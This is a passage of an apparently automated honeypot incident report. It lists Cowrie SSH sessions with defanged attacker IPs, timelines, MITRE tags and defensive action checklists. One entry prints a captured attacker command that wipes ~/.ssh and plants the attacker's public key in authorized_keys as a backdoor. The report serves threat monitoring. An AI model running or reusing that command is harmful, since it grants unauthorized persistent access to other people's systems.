| `2026-07-14 17:50:16` | `cowrie.client.kex` |
| `2026-07-14 17:50:18` | `cowrie.login.success` |
| `2026-07-14 17:50:19` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:50:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.0.34[.]106` to AbuseIPDB if not already reported
- [ ] Block `196.0.34[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4ee2f692d5b

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-14 17:53 |
| **Last Seen** | 2026-07-14 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:53:12` | `cowrie.session.connect` |
| `2026-07-14 17:53:12` | `cowrie.client.version` |
| `2026-07-14 17:53:12` | `cowrie.client.kex` |
| `2026-07-14 17:53:13` | `cowrie.login.success` |
| `2026-07-14 17:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1d573c7eda7

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-14 17:53 |
| **Last Seen** | 2026-07-14 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:53:12` | `cowrie.session.connect` |
| `2026-07-14 17:53:12` | `cowrie.client.version` |
| `2026-07-14 17:53:13` | `cowrie.client.kex` |
| `2026-07-14 17:53:14` | `cowrie.login.success` |
| `2026-07-14 17:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7af87d32b7d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-14 17:53 |
| **Last Seen** | 2026-07-14 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:53:19` | `cowrie.session.connect` |
| `2026-07-14 17:53:19` | `cowrie.client.version` |
| `2026-07-14 17:53:19` | `cowrie.client.kex` |
| `2026-07-14 17:53:19` | `cowrie.login.success` |
| `2026-07-14 17:53:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aec0ec5053b4

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-14 17:53 |
| **Last Seen** | 2026-07-14 17:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:53:20` | `cowrie.session.connect` |
| `2026-07-14 17:53:20` | `cowrie.client.version` |
| `2026-07-14 17:53:20` | `cowrie.client.kex` |
| `2026-07-14 17:53:20` | `cowrie.login.success` |
| `2026-07-14 17:53:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8bc546fc280

| Field | Detail |
|---|---|
| **Source IP** | `197.251.249[.]117` |
| **First Seen** | 2026-07-14 17:53 |
| **Last Seen** | 2026-07-14 17:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:53:39` | `cowrie.session.connect` |
| `2026-07-14 17:53:40` | `cowrie.client.version` |
| `2026-07-14 17:53:40` | `cowrie.client.kex` |
| `2026-07-14 17:53:41` | `cowrie.login.success` |
| `2026-07-14 17:53:42` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:53:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.251.249[.]117` to AbuseIPDB if not already reported
- [ ] Block `197.251.249[.]117` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ab8b5908797

| Field | Detail |
|---|---|
| **Source IP** | `138.68.243[.]18` |
| **First Seen** | 2026-07-14 17:56 |
| **Last Seen** | 2026-07-14 17:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:56:09` | `cowrie.session.connect` |
| `2026-07-14 17:56:09` | `cowrie.telnet.option` |
| `2026-07-14 17:56:09` | `cowrie.telnet.option` |
| `2026-07-14 17:57:10` | `cowrie.login.success` |
| `2026-07-14 17:57:10` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `138.68.243[.]18` to AbuseIPDB if not already reported
- [ ] Block `138.68.243[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1740931fa31

| Field | Detail |
|---|---|
| **Source IP** | `107.173.127[.]185` |
| **First Seen** | 2026-07-14 17:59 |
| **Last Seen** | 2026-07-14 17:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:59:33` | `cowrie.session.connect` |
| `2026-07-14 17:59:33` | `cowrie.client.version` |
| `2026-07-14 17:59:33` | `cowrie.client.kex` |
| `2026-07-14 17:59:36` | `cowrie.login.success` |
| `2026-07-14 17:59:37` | `cowrie.session.params` |
| `2026-07-14 17:59:37` | `cowrie.command.input` |
| `2026-07-14 17:59:38` | `cowrie.log.closed` |
| `2026-07-14 17:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.173.127[.]185` to AbuseIPDB if not already reported
- [ ] Block `107.173.127[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-682db7d17221

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-14 18:03 |
| **Last Seen** | 2026-07-14 18:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:03:15` | `cowrie.session.connect` |
| `2026-07-14 18:03:15` | `cowrie.client.version` |
| `2026-07-14 18:03:15` | `cowrie.client.kex` |
| `2026-07-14 18:03:16` | `cowrie.login.success` |
| `2026-07-14 18:03:17` | `cowrie.session.params` |
| `2026-07-14 18:03:17` | `cowrie.command.input` |
| `2026-07-14 18:03:17` | `cowrie.log.closed` |
| `2026-07-14 18:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16bd2c96f63b

| Field | Detail |
|---|---|
| **Source IP** | `190.5.200[.]98` |
| **First Seen** | 2026-07-14 18:05 |
| **Last Seen** | 2026-07-14 18:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:05:50` | `cowrie.session.connect` |
| `2026-07-14 18:05:50` | `cowrie.client.version` |
| `2026-07-14 18:05:50` | `cowrie.client.kex` |
| `2026-07-14 18:05:51` | `cowrie.login.success` |
| `2026-07-14 18:05:52` | `cowrie.session.params` |
| `2026-07-14 18:05:52` | `cowrie.command.input` |
| `2026-07-14 18:05:52` | `cowrie.command.failed` |
| `2026-07-14 18:05:52` | `cowrie.log.closed` |
| `2026-07-14 18:05:52` | `cowrie.session.params` |
| `2026-07-14 18:05:52` | `cowrie.command.input` |
| `2026-07-14 18:05:52` | `cowrie.session.file_download` |
| `2026-07-14 18:05:52` | `cowrie.log.closed` |
| `2026-07-14 18:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.5.200[.]98` to AbuseIPDB if not already reported
- [ ] Block `190.5.200[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39fa9de2a063

| Field | Detail |
|---|---|
| **Source IP** | `190.5.200[.]98` |
| **First Seen** | 2026-07-14 18:05 |
| **Last Seen** | 2026-07-14 18:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:05:52` | `cowrie.session.connect` |
| `2026-07-14 18:05:52` | `cowrie.client.version` |
| `2026-07-14 18:05:53` | `cowrie.client.kex` |
| `2026-07-14 18:05:53` | `cowrie.login.success` |
| `2026-07-14 18:05:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.5.200[.]98` to AbuseIPDB if not already reported
- [ ] Block `190.5.200[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bda084ba56db

| Field | Detail |
|---|---|
| **Source IP** | `190.5.200[.]98` |
| **First Seen** | 2026-07-14 18:05 |
| **Last Seen** | 2026-07-14 18:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:05:53` | `cowrie.session.connect` |
| `2026-07-14 18:05:53` | `cowrie.client.version` |
| `2026-07-14 18:05:53` | `cowrie.client.kex` |
| `2026-07-14 18:05:54` | `cowrie.login.success` |
| `2026-07-14 18:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.5.200[.]98` to AbuseIPDB if not already reported
- [ ] Block `190.5.200[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc52d5828697

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-14 18:07 |
| **Last Seen** | 2026-07-14 18:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:07:04` | `cowrie.session.connect` |
| `2026-07-14 18:07:04` | `cowrie.client.version` |
| `2026-07-14 18:07:04` | `cowrie.client.kex` |
| `2026-07-14 18:07:05` | `cowrie.login.success` |
| `2026-07-14 18:07:05` | `cowrie.direct-tcpip.request` |
| `2026-07-14 18:07:05` | `cowrie.direct-tcpip.data` |
| `2026-07-14 18:07:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-665d5659d314

| Field | Detail |
|---|---|
| **Source IP** | `203.92.36[.]109` |
| **First Seen** | 2026-07-14 18:15 |
| **Last Seen** | 2026-07-14 18:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:15:14` | `cowrie.session.connect` |
| `2026-07-14 18:15:15` | `cowrie.client.version` |
| `2026-07-14 18:15:15` | `cowrie.client.kex` |
| `2026-07-14 18:15:17` | `cowrie.login.success` |
| `2026-07-14 18:15:18` | `cowrie.direct-tcpip.request` |
| `2026-07-14 18:15:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.92.36[.]109` to AbuseIPDB if not already reported
- [ ] Block `203.92.36[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba4b8777ef80

| Field | Detail |
|---|---|
| **Source IP** | `210.4.68[.]72` |
| **First Seen** | 2026-07-14 18:15 |
| **Last Seen** | 2026-07-14 18:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:15:23` | `cowrie.session.connect` |
| `2026-07-14 18:15:23` | `cowrie.client.version` |
| `2026-07-14 18:15:23` | `cowrie.client.kex` |
| `2026-07-14 18:15:25` | `cowrie.login.success` |
| `2026-07-14 18:15:26` | `cowrie.direct-tcpip.request` |
| `2026-07-14 18:15:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.4.68[.]72` to AbuseIPDB if not already reported
- [ ] Block `210.4.68[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d23ce9cbcc5

| Field | Detail |
|---|---|
| **Source IP** | `92.84.21[.]186` |
| **First Seen** | 2026-07-14 18:15 |
| **Last Seen** | 2026-07-14 18:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:15:31` | `cowrie.session.connect` |
| `2026-07-14 18:15:32` | `cowrie.client.version` |
| `2026-07-14 18:15:32` | `cowrie.client.kex` |
| `2026-07-14 18:15:33` | `cowrie.login.success` |
| `2026-07-14 18:15:33` | `cowrie.direct-tcpip.request` |
| `2026-07-14 18:15:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.84.21[.]186` to AbuseIPDB if not already reported
- [ ] Block `92.84.21[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-654eaa42edd8

| Field | Detail |
|---|---|
| **Source IP** | `70.166.167[.]48` |
| **First Seen** | 2026-07-14 18:17 |
| **Last Seen** | 2026-07-14 18:22 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:17:29` | `cowrie.session.connect` |
| `2026-07-14 18:17:30` | `cowrie.client.version` |
| `2026-07-14 18:17:30` | `cowrie.client.kex` |
| `2026-07-14 18:17:31` | `cowrie.login.success` |
| `2026-07-14 18:17:32` | `cowrie.direct-tcpip.request` |
| `2026-07-14 18:22:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.166.167[.]48` to AbuseIPDB if not already reported
- [ ] Block `70.166.167[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4a4e66e8f99

| Field | Detail |
|---|---|
| **Source IP** | `121.66.124[.]148` |
| **First Seen** | 2026-07-14 18:17 |
| **Last Seen** | 2026-07-14 18:17 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:17:37` | `cowrie.session.connect` |
| `2026-07-14 18:17:38` | `cowrie.client.version` |
| `2026-07-14 18:17:38` | `cowrie.client.kex` |
| `2026-07-14 18:17:45` | `cowrie.login.success` |
| `2026-07-14 18:17:47` | `cowrie.direct-tcpip.request` |
| `2026-07-14 18:17:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.66.124[.]148` to AbuseIPDB if not already reported
- [ ] Block `121.66.124[.]148` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-334d78692fee

| Field | Detail |
|---|---|
| **Source IP** | `182.53.55[.]252` |
| **First Seen** | 2026-07-14 18:19 |
| **Last Seen** | 2026-07-14 18:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:19:05` | `cowrie.session.connect` |
| `2026-07-14 18:19:06` | `cowrie.client.version` |
| `2026-07-14 18:19:06` | `cowrie.client.kex` |
| `2026-07-14 18:19:09` | `cowrie.login.success` |
| `2026-07-14 18:19:09` | `cowrie.direct-tcpip.request` |
| `2026-07-14 18:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.53.55[.]252` to AbuseIPDB if not already reported
- [ ] Block `182.53.55[.]252` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-002240410de7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-14 18:23 |
| **Last Seen** | 2026-07-14 18:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:23:08` | `cowrie.session.connect` |
| `2026-07-14 18:23:08` | `cowrie.client.version` |
| `2026-07-14 18:23:09` | `cowrie.client.kex` |
| `2026-07-14 18:23:09` | `cowrie.login.success` |
| `2026-07-14 18:23:09` | `cowrie.direct-tcpip.request` |
| `2026-07-14 18:23:09` | `cowrie.direct-tcpip.ja4` |
| `2026-07-14 18:23:09` | `cowrie.direct-tcpip.data` |
| `2026-07-14 18:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b294970701f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-14 18:24 |
| **Last Seen** | 2026-07-14 18:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:24:55` | `cowrie.session.connect` |
| `2026-07-14 18:24:55` | `cowrie.client.version` |
| `2026-07-14 18:24:55` | `cowrie.client.kex` |
| `2026-07-14 18:24:55` | `cowrie.login.success` |
| `2026-07-14 18:24:56` | `cowrie.direct-tcpip.request` |
| `2026-07-14 18:24:56` | `cowrie.direct-tcpip.ja4` |
| `2026-07-14 18:24:56` | `cowrie.direct-tcpip.data` |
| `2026-07-14 18:24:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f6cb3813813

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]92` |
| **First Seen** | 2026-07-14 18:37 |
| **Last Seen** | 2026-07-14 18:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:37:11` | `cowrie.session.connect` |
| `2026-07-14 18:37:11` | `cowrie.client.version` |
| `2026-07-14 18:37:11` | `cowrie.client.kex` |
| `2026-07-14 18:37:11` | `cowrie.login.success` |
| `2026-07-14 18:37:12` | `cowrie.session.params` |
| `2026-07-14 18:37:12` | `cowrie.command.input` |
| `2026-07-14 18:37:12` | `cowrie.log.closed` |
| `2026-07-14 18:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]92` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccbb1d1e65ea

| Field | Detail |
|---|---|
| **Source IP** | `65.20.250[.]180` |
| **First Seen** | 2026-07-14 18:39 |
| **Last Seen** | 2026-07-14 18:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:39:14` | `cowrie.session.connect` |
| `2026-07-14 18:39:15` | `cowrie.client.version` |
| `2026-07-14 18:39:15` | `cowrie.client.kex` |
| `2026-07-14 18:39:17` | `cowrie.login.success` |
| `2026-07-14 18:39:17` | `cowrie.direct-tcpip.request` |
| `2026-07-14 18:39:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.250[.]180` to AbuseIPDB if not already reported
- [ ] Block `65.20.250[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fc4b70ddb43

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-14 18:39 |
| **Last Seen** | 2026-07-14 18:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:39:33` | `cowrie.session.connect` |
| `2026-07-14 18:39:33` | `cowrie.client.version` |
| `2026-07-14 18:39:33` | `cowrie.client.kex` |
| `2026-07-14 18:39:35` | `cowrie.login.success` |
| `2026-07-14 18:39:37` | `cowrie.session.params` |
| `2026-07-14 18:39:37` | `cowrie.command.input` |
| `2026-07-14 18:39:37` | `cowrie.log.closed` |
| `2026-07-14 18:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e427699d048

| Field | Detail |
|---|---|
| **Source IP** | `201.63.52[.]54` |
| **First Seen** | 2026-07-14 18:40 |
| **Last Seen** | 2026-07-14 18:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:40:10` | `cowrie.session.connect` |
| `2026-07-14 18:40:11` | `cowrie.client.version` |
| `2026-07-14 18:40:11` | `cowrie.client.kex` |
| `2026-07-14 18:40:13` | `cowrie.login.success` |
| `2026-07-14 18:40:14` | `cowrie.direct-tcpip.request` |
| `2026-07-14 18:40:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.52[.]54` to AbuseIPDB if not already reported
- [ ] Block `201.63.52[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-937b35539699

| Field | Detail |
|---|---|
| **Source IP** | `202.138.229[.]190` |
| **First Seen** | 2026-07-14 18:40 |
| **Last Seen** | 2026-07-14 18:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 18:40:19` | `cowrie.session.connect` |
| `2026-07-14 18:40:19` | `cowrie.client.version` |
| `2026-07-14 18:40:19` | `cowrie.client.kex` |
| `2026-07-14 18:40:21` | `cowrie.login.success` |
| `2026-07-14 18:40:22` | `cowrie.direct-tcpip.request` |
| `2026-07-14 18:40:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.138.229[.]190` to AbuseIPDB if not already reported
- [ ] Block `202.138.229[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ba074ef7157

| Field | Detail |
|---|---|
| **Source IP** | `107.150.110[.]217` |
| **First Seen** | 2026-07-14 18:40 |
| **Last Seen** | 2026-07-14 18:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
